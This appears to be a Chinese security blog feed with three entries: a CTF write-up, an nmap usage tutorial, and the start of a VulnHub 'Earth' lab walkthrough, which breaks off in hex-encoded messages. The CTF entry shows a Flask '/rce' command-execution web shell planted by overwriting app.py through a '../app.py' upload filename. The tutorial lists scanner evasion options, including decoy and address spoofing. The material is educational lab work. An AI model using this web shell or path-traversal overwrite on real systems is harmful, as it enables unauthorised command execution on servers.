class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/rce&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec_cmd</span>():<br>    cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>    output = subprocess.getoutput(cmd)<br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>利用BurpSuite抓包进而构造文件名为<code>../app.py</code></p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429202658946.png" alt="image-20250429202658946"></p><p>最后就可以访问<code>/rce</code>路由执行RCE</p><p><img src="/2025/04/29/NewYear%20CTF%202025-Web-%F0%9F%90%8D%E5%B9%B4%E5%A4%A7%E5%90%89/image-20250429202743223.png" alt="image-20250429202743223"></p>]]></content>
    
    
    <categories>
      
      <category>刷题练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传 源码覆盖</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nmap的使用</title>
    <link href="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/2302_82189125/article/details/135961736">https://blog.csdn.net/2302_82189125/article/details/135961736</a></p></blockquote><h1 id="nmap的主要功能"><a href="#nmap的主要功能" class="headerlink" title="nmap的主要功能"></a><code>nmap</code>的主要功能</h1><p>kali自带<code>nmap</code>，可以直接使用</p><ul><li><strong>主机发现：</strong> Nmap 可以通过发送网络探测包（<code>ping</code> 扫描）来确定一个网络中活跃的主机。这有助于确定哪些 IP 地址上有活动的设备。</li><li><strong>端口扫描：</strong> Nmap 可以扫描目标主机的开放端口，帮助确定哪些服务正在运行。它支持多种扫描技术，包括 TCP 扫描、UDP 扫描、SYN&#x2F;ACK 扫描等。</li><li><strong>服务识别：</strong> Nmap 可以识别目标主机上运行的具体服务和应用程序的版本号。这对于了解目标系统上可能存在的漏洞和弱点很有帮助。</li><li><strong>操作系统检测：</strong> Nmap 能够尝试检测目标主机的操作系统类型和版本。这有助于识别网络中的不同操作系统，并为后续的渗透测试提供信息。</li><li><strong>脚本扫描：</strong> Nmap 支持脚本扫描，允许用户执行自定义脚本以进行更深入的信息收集和安全审计。</li><li><strong>版本检测：</strong> Nmap 可以检测目标系统上运行的服务的版本信息。这对于确定目标系统上可能存在的已知漏洞和安全问题非常有用。</li><li><strong>输出格式：</strong> Nmap 可以生成多种输出格式，包括文本、XML、JSON 等，以便进一步的分析和报告。</li></ul><h1 id="nmap的使用方法"><a href="#nmap的使用方法" class="headerlink" title="nmap的使用方法"></a><code>nmap</code>的使用方法</h1><h2 id="主机"><a href="#主机" class="headerlink" title="主机"></a>主机</h2><h3 id="快速扫描"><a href="#快速扫描" class="headerlink" title="快速扫描"></a>快速扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 192.168.1.102，检测开放的端口和服务</span><br>nmap 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426151805995.png" alt="image-20250426151805995"></p><h3 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 192.168.1.102 和 192.168.1.103，检测开放的端口和服务</span><br>nmap 192.168.1.102 192.168.1.103<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426152013156.png" alt="image-20250426152013156"></p><h3 id="网段扫描"><a href="#网段扫描" class="headerlink" title="网段扫描"></a>网段扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip/子网掩码<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 192.168.1.103 所在的子网</span><br><span class="hljs-comment"># 会扫描 192.168.1.0 到 192.168.1.255 范围内的所有 IP 地址，查找存活主机、开放端口和服务</span><br>nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426153051960.png" alt="image-20250426153051960"></p><h3 id="过滤IP的网段扫描"><a href="#过滤IP的网段扫描" class="headerlink" title="过滤IP的网段扫描"></a>过滤IP的网段扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip/子网掩码 -exclude 需要过滤的ip或文件<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 192.168.1.0/24 子网中的所有主机，但排除 192.168.1.1</span><br>nmap 192.168.1.103/24 -exclude 192.168.1.1<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426152436796.png" alt="image-20250426152436796"></p><h3 id="仅扫描存活主机"><a href="#仅扫描存活主机" class="headerlink" title="仅扫描存活主机"></a>仅扫描存活主机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sP ip/子网掩码<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 只扫描 192.168.1.103 所在的子网的所有存活主机</span><br>nmap -sP 192.168.1.0/24<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426153445425.png" alt="image-20250426153445425"></p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p><strong>端口状态6种状态</strong></p><ul><li><strong><code>open（开放的）</code></strong>：端口上有应用程序正在监听并响应探测</li><li><strong><code>closed（关闭的）</code></strong>：端口不响应探测，可能被防火墙封锁或无应用程序监听</li><li><strong><code>filtered（被过滤的）</code></strong>：端口被防火墙等设备过滤，无法确定是否开放。</li><li><strong><code>unfiltered（未被过滤的）</code></strong>：端口可访问，但无法确定是开放还是关闭。</li><li><strong><code>open|filtered（开放或者被过滤的）</code></strong>：端口可能开放，也可能被过滤，需要进一步探测。</li><li><strong><code>closed|filtered（关闭或者被过滤的）</code></strong>：端口可能关闭，也可能被过滤，仅在特定扫描中出现。</li></ul><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip -p 端口号<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 IP 为 192.168.1.102 的 22 端口</span><br>nmap 192.168.1.102 -p 22<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426154157875.png" alt="image-20250426154157875"></p><h3 id="端口范围扫描"><a href="#端口范围扫描" class="headerlink" title="端口范围扫描"></a>端口范围扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap ip -p 范围<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描 IP 为 192.168.1.102 的 1 到 100 端口</span><br>nmap 192.168.1.102 -p 1-100<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426154559761.png" alt="image-20250426154559761"></p><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><h3 id="识别服务版本"><a href="#识别服务版本" class="headerlink" title="识别服务版本"></a>识别服务版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 识别 192.168.1.102 的服务</span><br>nmap -sV 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426155116268.png" alt="image-20250426155116268"></p><h3 id="识别具体端口的服务"><a href="#识别具体端口的服务" class="headerlink" title="识别具体端口的服务"></a>识别具体端口的服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV ip -p 端口号或范围<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 192.168.1.102 -p 22<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426155211943.png" alt="image-20250426155211943"></p><h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><h3 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -O ip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 识别 192.168.1.102 主机上运行的操作系统（需要root权限）</span><br>nmap -O 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/nmap%E7%9A%84%E4%BD%BF%E7%94%A8/image-20250426155629610.png" alt="image-20250426155629610"></p><h2 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a>扫描方式</h2><h3 id="TCP-SYN-扫描"><a href="#TCP-SYN-扫描" class="headerlink" title="TCP SYN 扫描"></a>TCP SYN 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sS ip<br></code></pre></td></tr></table></figure><h3 id="TCP-connect-扫描"><a href="#TCP-connect-扫描" class="headerlink" title="TCP connect() 扫描"></a>TCP connect() 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">此扫描为默认扫描，不用加参数<br></code></pre></td></tr></table></figure><h3 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sU ip<br></code></pre></td></tr></table></figure><h3 id="TCP-Null-扫描"><a href="#TCP-Null-扫描" class="headerlink" title="TCP Null 扫描"></a>TCP Null 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN ip<br></code></pre></td></tr></table></figure><h3 id="TCP-FIN-扫描"><a href="#TCP-FIN-扫描" class="headerlink" title="TCP FIN 扫描"></a>TCP FIN 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sF ip<br></code></pre></td></tr></table></figure><h3 id="TCP-Xmas-扫描"><a href="#TCP-Xmas-扫描" class="headerlink" title="TCP Xmas 扫描"></a>TCP Xmas 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sX ip<br></code></pre></td></tr></table></figure><h3 id="TCP-ACK-扫描"><a href="#TCP-ACK-扫描" class="headerlink" title="TCP ACK 扫描"></a>TCP ACK 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sA ip<br></code></pre></td></tr></table></figure><h3 id="TCP-窗口扫描"><a href="#TCP-窗口扫描" class="headerlink" title="TCP 窗口扫描"></a>TCP 窗口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sW ip<br></code></pre></td></tr></table></figure><h3 id="TCP-Maimon-扫描"><a href="#TCP-Maimon-扫描" class="headerlink" title="TCP Maimon 扫描"></a>TCP Maimon 扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sM ip<br></code></pre></td></tr></table></figure><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="报文分段"><a href="#报文分段" class="headerlink" title="报文分段"></a>报文分段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -f ip<br></code></pre></td></tr></table></figure><h3 id="最大传输单元"><a href="#最大传输单元" class="headerlink" title="最大传输单元"></a>最大传输单元</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --mtu 1500 ip<br></code></pre></td></tr></table></figure><h3 id="诱饵隐藏扫描"><a href="#诱饵隐藏扫描" class="headerlink" title="诱饵隐藏扫描"></a>诱饵隐藏扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -D &lt;ip,ip,ip……&gt; 目标 ip<br></code></pre></td></tr></table></figure><h3 id="源地址哄骗"><a href="#源地址哄骗" class="headerlink" title="源地址哄骗"></a>源地址哄骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -S &lt;伪装的源 ip&gt; ip<br></code></pre></td></tr></table></figure><h3 id="源端口哄骗"><a href="#源端口哄骗" class="headerlink" title="源端口哄骗"></a>源端口哄骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --source-port 或 -g &lt;源端口号&gt; ip<br></code></pre></td></tr></table></figure><h3 id="附加随机数据"><a href="#附加随机数据" class="headerlink" title="附加随机数据"></a>附加随机数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --data-length &lt;长度&gt; ip<br></code></pre></td></tr></table></figure><h3 id="生存时间"><a href="#生存时间" class="headerlink" title="生存时间"></a>生存时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --ttl &lt;值&gt; ip<br></code></pre></td></tr></table></figure><h3 id="MAC-地址哄骗"><a href="#MAC-地址哄骗" class="headerlink" title="MAC 地址哄骗"></a>MAC 地址哄骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --spoof-mac &lt;mac 地址&gt; ip<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透打靶小知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透打靶 小知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VulnHub靶机Earth复现</title>
    <link href="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>借鉴文章：</p><p><a href="https://blog.csdn.net/Czheisenberg/article/details/122900121">https://blog.csdn.net/Czheisenberg/article/details/122900121</a></p><p><a href="https://www.cnblogs.com/sainet/p/15638010.html">https://www.cnblogs.com/sainet/p/15638010.html</a></p></blockquote><h1 id="安装靶机"><a href="#安装靶机" class="headerlink" title="安装靶机"></a>安装靶机</h1><p>靶机网址：<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p><p>VirtualBox网址：<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><h1 id="IP探测"><a href="#IP探测" class="headerlink" title="IP探测"></a>IP探测</h1><h3 id="寻找靶机"><a href="#寻找靶机" class="headerlink" title="寻找靶机"></a>寻找靶机</h3><p>要确保靶机和kali都出于同一个网段上（可以都是用桥连方式）</p><p>先查看kali的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426120844444.png" alt="image-20250426120844444"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kali的IP：</span><br>192.168.1.103<br></code></pre></td></tr></table></figure><h4 id="使用nmap工具扫描"><a href="#使用nmap工具扫描" class="headerlink" title="使用nmap工具扫描"></a>使用<code>nmap</code>工具扫描</h4><p>最好在打开靶机之前扫描一次，在打开靶机之后扫描一次，这样容易对比出哪一个是靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap 192.168.1.0/24<br></code></pre></td></tr></table></figure><p>打开靶机前扫描结果</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426121849445.png" alt="image-20250426121849445"></p><p>打开靶机后扫描结果</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426122105966.png" alt="image-20250426122105966"></p><p>可以发现多出了102，这个就是靶机的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 靶机的IP</span><br>192.168.1.102<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kali的IP：</span><br>192.168.1.103<br><span class="hljs-comment"># 靶机的IP</span><br>192.168.1.102<br></code></pre></td></tr></table></figure><h3 id="深入探测"><a href="#深入探测" class="headerlink" title="深入探测"></a>深入探测</h3><p>使用<code>nmap</code>进行深入探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426122805931.png" alt="image-20250426122805931"></p><p>开放了<code>22</code>、<code>80</code>、<code>443</code>三个端口，并且<code>80</code>和<code>443</code>都是python3.9，还在<code>443</code>端口发现存在DNS解析</p><h1 id="HTTPS探测"><a href="#HTTPS探测" class="headerlink" title="HTTPS探测"></a>HTTPS探测</h1><p>有DNS解析，需要手动修改<code>/etc/hosts</code>，添加DNS解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows文件路径</span><br>C:\Windows\System32\dirvers\etc\hosts<br><span class="hljs-comment"># Linux文件路径</span><br>/etc/hosts<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426123657419.png" alt="image-20250426123657419"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426123731272.png" alt="image-20250426123731272"></p><p>然后就可以访问网站了，第一个网站</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//earth.local/</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAEarth%E5%A4%8D%E7%8E%B0/image-20250426124114446.png" alt="image-20250426124114446"></p><p>下面有<code>Previous Messages</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">37090</span>b<span class="hljs-number">59030</span>f<span class="hljs-number">11060</span>b<span class="hljs-number">0</span>a<span class="hljs-number">1</span>b<span class="hljs-number">4e0000000000004312170</span>a<span class="hljs-number">1</span>b<span class="hljs-number">0</span>b<span class="hljs-number">0e4107174</span>f<span class="hljs-number">1</span>a<span class="hljs-number">0</span>b<span class="hljs-number">044e0</span>a<span class="hljs-number">000202134e0</span>a<span class="hljs-number">161</span>d<span class="hljs-number">17040359061</span>d<span class="hljs-number">43370</span>f<span class="hljs-number">15030</span>b<span class="hljs-number">10414e340</span>e<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">0</span>f<span class="hljs-number">0</span>b<span class="hljs-number">0</span>b<span class="hljs-number">061</span>d<span class="hljs-number">430e0059220</span>f<span class="hljs-number">11124059261</span>ae<span class="hljs-number">281</span>ba<span class="hljs-number">124e14001</span><span class="hljs-keyword">c</span><span class="hljs-number">06411</span>a<span class="hljs-number">110e00435542495</span>f<span class="hljs-number">5e430</span>a<span class="hljs-number">0715000306150</span>b<span class="hljs-number">0</span>b<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">4e4</span>b<span class="hljs-number">5242495</span>f<span class="hljs-number">5e430</span><span class="hljs-keyword">c</span><span class="hljs-number">07150</span>a<span class="hljs-number">1</span>d<span class="hljs-number">4</span>a<span class="hljs-number">410216010943e281</span>b<span class="hljs-number">54e1</span><span class="hljs-keyword">c</span><span class="hljs-number">0101160606591</span>b<span class="hljs-number">0143121</span>a<span class="hljs-number">0</span>b<span class="hljs-number">0</span>a<span class="hljs-number">1</span>a<span class="hljs-number">00094e1</span>f<span class="hljs-number">1</span>d<span class="hljs-number">010e412</span>d<span class="hljs-number">180307050e1</span><span class="hljs-keyword">c</span><span class="hljs-number">17060</span>f<span class="hljs-number">43150159210</span>b<span class="hljs-number">144137161</span>d<span class="hljs-number">054</span>d<span class="hljs-number">41270</span>d<span class="hljs-number">4</span>f<span class="hljs-number">0710410010010</span>b<span class="hljs-number">431507140</span>a<span class="hljs-number">1</span>d<span class="hljs-number">43001</span>d<span class="hljs-number">5903010</span>d<span class="hljs-number">064e18010</span>a<span class="hljs-number">4307010</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">4e1708031</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">4e02124</span>e<span class="hljs-number">1</span>d<span class="hljs-number">0</span>a<span class="hljs-number">0</span>b<span class="hljs-number">13410</span>f<span class="hljs-number">0</span>a<span class="hljs-number">4</span>f<span class="hljs-number">2</span>b<span class="hljs-number">02131</span>a<span class="hljs-number">11e281</span>b<span class="hljs-number">61</span>d<span class="hljs-number">43261</span><span class="hljs-keyword">c</span><span class="hljs-number">18010</span>a<span class="hljs-number">43220</span>f<span class="hljs-number">1716010</span>d<span class="hljs-number">40</span><br> <br><span class="hljs-number">3714171e0</span>b<span class="hljs-number">0</span>a<span class="hljs-number">550</span>a<span class="hljs-number">1859101</span>d<span class="hljs-number">064</span>b<span class="hljs-number">160</span>a<span class="hljs-number">191</span>a<span class="hljs-number">4</span>b<span class="hljs-number">0908140</span>d<span class="hljs-number">0e0</span>d<span class="hljs-number">441</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">4</span>b<span class="hljs-number">1611074318160814114</span>b<span class="hljs-number">0</span>a<span class="hljs-number">1</span>d<span class="hljs-number">06170e1444010</span>b<span class="hljs-number">0</span>a<span class="hljs-number">0</span>d<span class="hljs-number">441</span><span class="hljs-keyword">c</span><span class="hljs-number">104</span>b<span class="hljs-number">150106104</span>b<span class="hljs-number">1</span>d<span class="hljs-number">011</span>b<span class="hljs-number">100e59101</span>d<span class="hljs-number">0205591314170e0</span>b<span class="hljs-number">4</span>a<span class="hljs-number">552</span>a<span class="hljs-number">1</span>f<span class="hljs-number">59071</span>a<span class="hljs-number">16071</span>d<span class="hljs-number">44130</span>f<span class="hljs-number">041810550</span>a<span class="hljs-number">05590555010</span>a<span class="hljs-number">0</span>d<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">011609590</span>d<span class="hljs-number">13430</span>a<span class="hljs-number">171</span>d<span class="hljs-number">170</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>f<span class="hljs-number">0044160</span><span class="hljs-keyword">c</span><span class="hljs-number">1e150055011</span>e<span class="hljs-number">100811430</span>a<span class="hljs-number">59061417030</span>d<span class="hljs-number">1117430910035506051611120</span>b<span class="hljs-number">45</span><br> <br><span class="hljs-number">2402111</span>b<span class="hljs-number">1</span>a<span class="hljs-number">0705070</span>a<span class="hljs-number">41000</span>a<span class="hljs-number">431</span>a<span class="hljs-number">000</span>a<span class="hljs-number">0e0</span>a<span class="hljs-number">0</span>f<span class="hljs-number">04104601164</span>d<span class="hljs-number">050</span>f<span class="hljs-number">070</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>f<span class="hljs-number">15540</span>d<span class="hljs-number">1018000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">06410</span>f<span class="hljs-number">0901420e105</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">074</span>d<span class="hljs-number">04181</span>a<span class="hljs-number">01041</span><span class="hljs-keyword">c</span><span class="hljs-number">170</span>d<span class="hljs-number">4</span>f<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">13000</span>d<span class="hljs-number">430e0</span>e<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">0006410</span>b<span class="hljs-number">420</span>d<span class="hljs-number">074</span>d<span class="hljs-number">55404645031</span>b<span class="hljs-number">18040</span>a<span class="hljs-number">03074</span>d<span class="hljs-number">181104111</span>b<span class="hljs-number">410</span>f<span class="hljs-number">000</span>a<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">41335</span>d<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">040</span>f<span class="hljs-number">4e070</span>d<span class="hljs-number">04521201111</span>f<span class="hljs-number">1</span>d<span class="hljs-number">4</span>d<span class="hljs-number">031</span>d<span class="hljs-number">090</span>f<span class="hljs-number">010e00471</span><span class="hljs-keyword">c</span><span class="hljs-number">07001647481</span>a<span class="hljs-number">0</span>b<span class="hljs-number">412</span>b<span class="hljs-number">1217151</span>a<span class="hljs-number">531</span>b<span class="hljs-number">4304001e151</span>b<span class="hljs-number">171</span>a<span class="hljs-number">4441020e030741054418100</span><span class="hljs-keyword">c</span><span class="hljs-number">130</span>b<span class="hljs-number">1745081</span><span class="hljs-keyword">c</span><span class="hljs-number">541</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">0949020211040</span>d<span 